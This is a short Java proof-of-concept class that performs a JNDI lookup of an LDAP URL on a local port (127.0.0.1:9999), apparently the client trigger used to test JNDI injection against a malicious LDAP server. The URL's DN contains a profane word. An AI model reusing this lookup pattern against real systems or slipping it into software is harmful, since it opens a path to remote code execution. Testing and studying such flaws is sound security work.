import javax.naming.directory.DirContext;
import javax.naming.directory.InitialDirContext;

public class Poc {
    public static void main(String[] args) throws Exception{
        String url = "ldap://127.0.0.1:9999/cn=exp,dc=ldap,dc=fuck";
        DirContext ctx = new InitialDirContext();
        ctx.lookup(url);
    }
}